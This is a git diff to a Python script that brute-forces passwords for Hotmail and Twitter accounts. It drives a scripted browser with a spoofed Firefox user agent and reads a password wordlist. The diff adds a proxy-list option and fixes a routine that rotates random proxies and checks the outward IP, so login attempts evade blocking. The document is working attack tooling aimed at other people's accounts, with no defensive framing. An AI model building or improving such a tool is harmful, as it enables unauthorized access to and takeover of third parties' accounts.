@@ -36,6 +36,7 @@ _____________________                              _____________________
 -T --twitter                            ACCOUNT  twitter @
 -l --list                               List    Password BrutoForce
 -p --password                           Single  Password
+-X --proxy                              Proxy list 
                             
 							   """.format(G,R))
 
@@ -44,13 +45,15 @@ use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail"
 use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
 use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
 use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
+use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
 (options,args) = use.parse_args()
 
 brows = Browser()
+
 brows.set_handle_robots(False)
 brows._factory.is_html = True
 brows.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)')]
-
+proxyList = options.proxy
 def proxy():
     logging.basicConfig()
     pl = ProxyList()
@@ -60,12 +63,11 @@ def proxy():
         sys.exit('[!] Proxy File format has incorrect | EXIT...')
     pl.random()
     getProxy = pl.random().address()
-    browser.set_proxies(proxies={"https": getProxy})
+    brows.set_proxies(proxies={"https": getProxy})
     try:
-        checkProxyIP = browser.open("https://api.ipify.org/?format=raw", timeout=2)
+        checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=2)
     except:
         return proxy()
-   
 
 def twitter():
     password_list = io.open(options.list_password,"r").readlines()
